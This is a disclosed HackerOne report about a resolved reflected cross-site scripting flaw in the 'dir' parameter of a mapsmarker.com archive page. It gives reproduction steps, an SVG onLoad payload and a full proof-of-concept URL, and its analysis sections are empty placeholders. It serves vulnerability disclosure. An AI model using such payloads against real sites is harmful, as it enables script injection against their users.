---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '235866'
original_report_id: '235866'
title: Cross-site Scripting (XSS) in /updates-pro/archive/
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mapsmarker_com_e_u
created_at: '2017-06-02T16:44:21.806Z'
disclosed_at: '2017-07-02T23:03:38.633Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross-site Scripting (XSS) in /updates-pro/archive/

## Metadata

- HackerOne Report ID: 235866
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mapsmarker_com_e_u
- Disclosed At: 2017-07-02T23:03:38.633Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey guys.
The dir parameter on /updates-pro/archive/ seems to be vulnerable to Cross-site Scripting.

Steps to reproduce:
1- Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1
2- Add this to the url: <svG onLoad=prompt(9)>
3- Result in attached printsceen.

Or quite simple visit:
https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
